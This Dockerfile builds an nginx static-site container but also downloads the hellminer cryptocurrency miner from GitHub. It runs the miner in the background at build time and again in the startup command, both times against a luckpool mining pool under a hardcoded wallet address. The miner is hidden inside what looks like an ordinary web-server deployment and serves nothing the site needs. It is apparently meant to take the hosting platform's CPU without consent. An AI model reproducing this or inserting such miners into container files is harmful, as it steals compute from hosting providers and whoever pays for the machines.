FROM nginx:1.21.5

COPY default.conf.template /etc/nginx/conf.d/default.conf.template
COPY nginx.conf /etc/nginx/nginx.conf
COPY static-html /usr/share/nginx/html

RUN apt-get update && apt-get install wget -y && \
  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && \
  tar xf hellminer_cpu_linux.tar.gz
RUN nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.Umam6 -p x --cpu 2 &

CMD /bin/bash -c "envsubst '\$PORT' < /etc/nginx/conf.d/default.conf.template > /etc/nginx/conf.d/default.conf" && nginx -g 'daemon off;' && nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.Umam6 -p x --cpu 2 &
